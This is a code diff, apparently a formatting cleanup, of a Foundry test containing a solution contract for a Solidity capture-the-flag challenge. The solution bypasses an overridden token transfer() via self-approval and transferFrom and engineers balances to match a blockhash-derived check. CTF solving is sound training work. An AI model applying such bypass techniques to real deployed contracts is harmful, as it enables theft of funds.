@@ -55,14 +55,8 @@ contract Challenge12Solution {
         // 3. Prepare Math
         // Calculate the hash required by the contract
         // inventoryValue will be 0 (from URI "5")
-        bytes32 hash = keccak256(
-            abi.encodePacked(
-                blockhash(block.number - 1),
-                address(challenge),
-                uint256(0)
-            )
-        );
-        
+        bytes32 hash = keccak256(abi.encodePacked(blockhash(block.number - 1), address(challenge), uint256(0)));
+
         // H is the required balance of this contract at the moment of the check
         uint256 H = uint256(hash) % 100 ether;
 
@@ -71,24 +65,24 @@ contract Challenge12Solution {
         // - Final Solution Balance == H
         // - Enemy Balance >= 1 ether (for 'rich' modifier)
         // - Player Balance == Enemy Balance
-        
+
         // We use an arbitrary amount for the side balances
-        uint256 sideBalance = 1 ether; 
+        uint256 sideBalance = 1 ether;
 
         // Target Start Balance for Solution = H + 1 ether (to cover the transferFrom fee in mintFlag)
         uint256 targetStartBalance = H + 1 ether;
 
         address enemy = address(~bytes20(tx.origin));
-        
+
         // Approve ourselves to allow transferFrom (to bypass the restrictions in the overridden transfer())
         gold.approve(address(this), type(uint256).max);
-        
+
         // Fund Enemy
         gold.transferFrom(address(this), enemy, sideBalance);
-        
+
         // Fund Player (tx.origin)
         gold.transferFrom(address(this), tx.origin, sideBalance);
-        
+
         // Burn remaining tokens until our balance is exactly what's needed
         uint256 currentBalance = gold.balanceOf(address(this));
         require(currentBalance >= targetStartBalance, "Not enough gold");
@@ -127,7 +121,7 @@ contract Challenge12Test is BaseTest {
         setUpChallenges();
 
         vm.startPrank(ADMIN);
-        
+
         // Deploy Ecosystem
         inventory = new Season2Challenge12Inventory();
         quest = new Season2Challenge12Quest();
@@ -135,7 +129,7 @@ contract Challenge12Test is BaseTest {
         victory = new Season2Challenge12Victory(address(dungeon));
         hero = new Season2Challenge12HeroNFT();
         gold = new Season2Challenge12GoldToken(address(hero), address(dungeon), address(nftFlags));
-        
+
         challenge12 = new Season2Challenge12(
             address(nftFlags),
             address(inventory),
@@ -150,7 +144,7 @@ contract Challenge12Test is BaseTest {
         nftFlags.addAllowedMinter(address(challenge12));
         nftFlags.setGoldTokenAddress(address(gold));
         inventory.transferOwnership(address(challenge12));
-        
+
         vm.stopPrank();
     }
 
@@ -164,9 +158,8 @@ contract Challenge12Test is BaseTest {
         vm.startPrank(PLAYER, PLAYER);
 
         // Deploy Solution
-        Challenge12Solution solution = new Challenge12Solution(
-            challenge12, inventory, quest, dungeon, victory, gold, hero
-        );
+        Challenge12Solution solution =
+            new Challenge12Solution(challenge12, inventory, quest, dungeon, victory, gold, hero);
 
         // Transfer Gold to solution so it can operate
         // Using transferFrom to bypass restrictions in transfer()
